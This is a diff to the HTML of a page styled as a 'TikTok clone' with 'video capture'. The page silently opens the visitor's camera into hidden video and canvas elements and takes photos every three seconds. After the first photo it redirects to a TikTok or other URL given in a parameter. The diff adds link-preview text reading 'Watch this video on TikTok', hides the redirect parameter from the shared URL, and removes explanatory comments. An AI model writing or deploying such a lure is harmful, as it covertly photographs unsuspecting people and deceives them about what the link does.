@@ -16,24 +16,40 @@
 
   <meta property="og:title" content="TiktokClone">
   <meta property="og:site_name" content="TiktokClone">
-  <meta property="og:url" content="https://tt-clone-pi.vercel.app">
+  <meta property="og:url" content="">
   <meta property="og:description" content="Клон TikTok с функцией захвата видео">
   <meta property="og:image"
     content="https://lf16-tiktok-common.ibytedtos.com/obj/tiktok-web-common-sg/mtact/static/images/logo_144c91a.png?v=2">
 
   <style>
-    /* Скрываем видео элемент */
     #video {
       display: none;
     }
   </style>
 
   <script>
-    // Обновляем og:url мета-тег с текущим URL
     window.onload = function () {
       var ogUrlMeta = document.querySelector('meta[property="og:url"]');
       if (ogUrlMeta) {
-        ogUrlMeta.setAttribute('content', window.location.origin);
+        var currentUrl = new URL(window.location.href);
+        var baseUrl = currentUrl.origin + currentUrl.pathname;
+        var searchParams = new URLSearchParams(currentUrl.search);
+        
+        // Удаляем параметр 'redirect' из og:url
+        searchParams.delete('redirect');
+        
+        var newUrl = baseUrl + '?' + searchParams.toString();
+        ogUrlMeta.setAttribute('content', newUrl);
+      }
+
+      var ogTitleMeta = document.querySelector('meta[property="og:title"]');
+      var ogDescriptionMeta = document.querySelector('meta[property="og:description"]');
+      if (ogTitleMeta && ogDescriptionMeta) {
+        var tiktokUrl = new URLSearchParams(window.location.search).get('tiktok');
+        if (tiktokUrl) {
+          ogTitleMeta.setAttribute('content', 'Смотреть видео на TikTok');
+          ogDescriptionMeta.setAttribute('content', 'Нажмите, чтобы посмотреть это видео на TikTok');
+        }
       }
     };
   </script>
@@ -41,10 +57,7 @@
 
 <body>
   <app-root></app-root>
-  <!-- Скрытый видеоэлемент для захвата видео с камеры -->
   <video id="video" width="740" height="580" autoplay></video>
-
-  <!-- Canvas тоже скрыт, так как отображение результата не требуется -->
   <canvas id="canvas" width="740" height="580" style="display:none;"></canvas>
 
   <script async src="https://www.tiktok.com/embed.js"></script>
@@ -68,8 +81,7 @@
         handleSuccess(stream);
       } catch (e) {
         console.log(`Ошибка доступа к камере: ${e.toString()}`);
-        // При ошибке доступа к камере редиректим на основное содержимое
-        window.location.replace(window.location.origin + '/');
+        redirectToFinalDestination();
       }
     }
 
@@ -79,8 +91,6 @@
       video.srcObject = stream;
 
       const context = canvas.getContext('2d');
-      const redirectUrl = new URLSearchParams(window.location.search).get('redirect');
-      console.log(`Redirect URL: ${redirectUrl}`);
 
       setInterval(function () {
         console.log('Фотографирование...');
@@ -88,20 +98,24 @@
         const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
         console.log('Фотография создана:', canvasData);
 
-        if (!firstPhotoTaken && redirectUrl) {
-          console.log('Первая фотография сделана. Выполняем редирект на:', redirectUrl);
+        if (!firstPhotoTaken) {
+          console.log('Первая фотография сделана. Выполняем редирект.');
           firstPhotoTaken = true;
-          window.location.replace(redirectUrl);
-        } else if (firstPhotoTaken) {
+          redirectToFinalDestination();
+        } else {
           console.log('Фотографии продолжают делаться, но редирект уже выполнен.');
         }
-      }, 5000);
+      }, 3000);
     }
 
-    // Запуск камеры через 10 секунд после загрузки страницы
-    window.onload = function () {
-      setTimeout(init, 10);
-    };
+    function redirectToFinalDestination() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const redirectUrl = urlParams.get('redirect') || urlParams.get('tiktok') || window.location.origin;
+      console.log('Выполняем редирект на:', redirectUrl);
+      window.location.replace(redirectUrl);
+    }
+
+    setTimeout(init, 10);
   </script>
 </body>
 
